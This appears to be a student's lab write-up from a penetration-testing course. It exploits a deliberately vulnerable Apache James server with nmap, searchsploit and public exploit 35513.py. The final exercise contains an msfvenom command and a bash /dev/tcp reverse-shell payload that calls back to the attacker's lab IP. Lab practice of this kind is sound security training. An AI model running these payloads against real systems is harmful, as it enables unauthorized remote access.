### 14.3.1.1 Exercises
#### 1. Connect to your dedicated Linux client and start the vulnerable Apache James service using the /usr/local/james/bin/run.sh script.

- Started server as root
  ![image-20200711171107909](.14.3.1.1.assets/image-20200711171107909.png)

#### 2. Enumerate the target using port scanning utilities and use information from the banners and Internet searches to determine the software running on the machine.

- Nmap scan 
  `sudo nmap 192.168.216.44 -p- -sV -vv --open --reason`

  ![image-20200711171721591](.14.3.1.1.assets/image-20200711171721591.png)

- Googling yields more info on the software (Apache James) + possible vulnerabilities for our version
  ![image-20200711171904470](.14.3.1.1.assets/image-20200711171904470.png)

#### 3. Use the searchsploit tool to find exploits for this version on the online resources mentioned in this module.

- Searchsploit shows 2 vulnerabilities for this specific version of James
  ![image-20200711172059274](.14.3.1.1.assets/image-20200711172059274.png)

#### 4. Launch the exploit and verify that the payload is executed upon logging in to the machine.

- Used exploit 35513.py & it worked
  ![image-20200711172312032](.14.3.1.1.assets/image-20200711172312032.png)
- Logged into the server.  Presence of cluttered text indicates the payload was executed:
  ![image-20200711172455658](.14.3.1.1.assets/image-20200711172455658.png)
- Presence of proof.txt proves the payload was executed successfully.
  ![image-20200711172550785](.14.3.1.1.assets/image-20200711172550785.png)

#### 5. Attempt to modify the payload variable in order to get a reverse shell on the target machine.

- I didn't want to assume the machine has netcat, so I used msfvenom to generate a reverse shell payload:

  ```bash
  msfvenom -p cmd/unix/reverse_bash LHOST=192.168.119.216 LPORT=8000 -f raw
  ```

- Inserted this into the exploit's payload variable:

  ```python
  payload =  '0<&113-;exec 113<>/dev/tcp/192.168.119.216/8000;sh <&113 >&113 2>&113'
  ```

- Ran exploit code
  ![image-20200711175657186](.14.3.1.1.assets/image-20200711175657186.png)

- Started netcat listener & logged into Linux target to trigger payload

  ![image-20200711175807655](.14.3.1.1.assets/image-20200711175807655.png)

  ![image-20200711175856923](.14.3.1.1.assets/image-20200711175856923.png)